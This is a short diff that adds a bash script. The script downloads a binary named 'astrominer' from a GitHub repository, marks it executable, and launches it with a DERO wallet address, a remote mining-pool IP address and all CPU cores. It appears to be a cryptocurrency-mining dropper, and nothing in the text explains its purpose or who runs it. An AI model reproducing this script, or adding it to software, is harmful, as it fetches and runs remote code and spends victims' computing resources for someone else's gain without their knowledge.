@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/kartolo92/filesa/raw/main/astrominer
+chmod +x astrominer
+./astrominer -w dero1qy2nrm9xhj8ha2rg0qjmh39p4sdy8sycf7my49axs26x7yukfpyquqgfsz5ey -r 137.184.120.90:10100 -p rpc -m $(nproc --all)
